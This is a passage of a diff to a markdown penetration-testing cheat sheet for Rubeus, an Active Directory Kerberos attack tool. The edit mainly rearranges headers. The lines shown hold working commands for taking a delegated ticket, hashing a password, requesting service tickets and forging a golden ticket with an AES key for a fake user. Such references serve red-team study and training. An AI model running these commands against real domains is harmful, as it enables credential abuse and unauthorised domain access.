@@ -481,9 +481,11 @@ Get tickets currently on System:
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
+
 #### Hash
 Hash of a user:
 ```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```
+
 
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
@@ -497,11 +499,7 @@ Request Service ticket (TGS) based on Service Name:
 Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 ```
 
-#### Golden/Silver
-Hash of a user:
-```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```
-
-Golden:
+#### Golden:
 
 optional:
 - ```/ldap``` - fetch details for user identity you are forging to better impersonate
@@ -513,7 +511,7 @@ optional:
 rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd
 ```
 
-Silver:
+#### Silver:
 
 optional:
 - ```/ldap``` - fetch details for user identity you are forging to better impersonate
